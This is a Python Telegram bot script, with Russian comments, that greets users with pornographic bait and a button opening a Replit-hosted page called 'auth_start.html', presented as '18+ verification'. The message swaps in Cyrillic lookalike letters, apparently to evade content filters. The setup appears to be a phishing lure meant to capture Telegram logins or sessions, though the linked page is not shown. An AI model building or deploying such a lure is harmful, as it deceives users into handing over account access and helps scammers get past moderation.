import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, WebAppInfo
from config import Config

# --- ССЫЛКА НА САЙТ ---
# Используем Replit
WEBAPP_URL = 'https://zoved-site-maker--liosliosefr.replit.app/auth_start.html' 

logging.basicConfig(level=logging.INFO)

bot = Bot(token=Config.BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="🔞Watch P0RN", web_app=WebAppInfo(url=WEBAPP_URL))
            ]
        ],
        resize_keyboard=True, # Делает кнопку нормального размера
        input_field_placeholder="Press the button below..." # Подсказка в поле ввода
    )
    
    text = (
        "😍Hеу, dо уоu wаnt tо sее sоmе rеаllу juiсу аnd hоt рorn? 💋 "
        "Рrеss thе buttоn bеlоw аnd еnjоу уоursеlf. "
        "🔞 Gо thrоugh 18+ vеrifiсаtiоn tо соntinuе.\n"
        "👇👇👇"
    )
    
    await message.answer(text, reply_markup=kb)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())